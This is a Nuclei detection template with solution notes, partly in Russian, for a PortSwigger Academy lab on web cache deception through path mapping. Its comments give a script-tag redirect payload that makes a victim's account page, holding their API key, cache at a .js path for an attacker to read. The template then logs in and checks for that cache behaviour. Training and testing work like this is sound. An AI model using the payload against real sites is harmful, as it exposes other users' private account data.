# POC
# Решение
# Exploit server: <script>document.location="https://YOUR-LAB-ID.web-security-academy.net/my-account/bbbbbbbbb.js"</script>
# Deliver exploit to victim
# Открыть Access Log - обязательно найти лог с другого IP адреса GET /exploit
# In Proxy (ZAP, Burp) go to https://YOUR-LAB-ID.web-security-academy.net/my-account/bbbbbbbbb.js >>> Find API key for carlos
# Submit solution

id: POC_lab-wcd-exploiting-path-mapping

info:
  name: POC_lab-wcd-exploiting-path-mapping
  author: FIR_UIII
  severity: high
  description: Exploiting path mapping for web cache deception
  reference: https://portswigger.net/web-security/web-cache-deception/lab-wcd-exploiting-path-mapping
  tags: cache_deception, portswigger

http:
  - raw: 
      - |
        GET /login HTTP/1.1
        Host: {{Hostname}}

      - |
        POST /login HTTP/1.1
        Host: {{Hostname}}
        Origin: {{RootURL}}
        Content-Type: application/x-www-form-urlencoded
        
        csrf={{csrf}}&username=wiener&password=peter
      
      - |
        GET /my-account/aaaaaaaaaaa.js HTTP/1.1
        Host: {{Hostname}}

    redirects: true
    cookie-reuse: true

    extractors:
      - type: regex
        name: csrf
        part: body
        internal: true
        group: 1
        regex:
          - 'name="csrf" value="([a-zA-Z0-9]{32})'
    req-condition: true

    matchers-condition: and
    matchers:
    - type: word # этот матч должен сработать на запросе /my-account/aaaaaaaaaaa.js
      words:
        - 'Cache-Control: max-age=30'
        - 'X-Cache: miss'
      part: header
      condition: and
    
    - type: word # этот матч должен сработать на запросе POST /login
      words:
        - 'Your API Key is'
      part: body
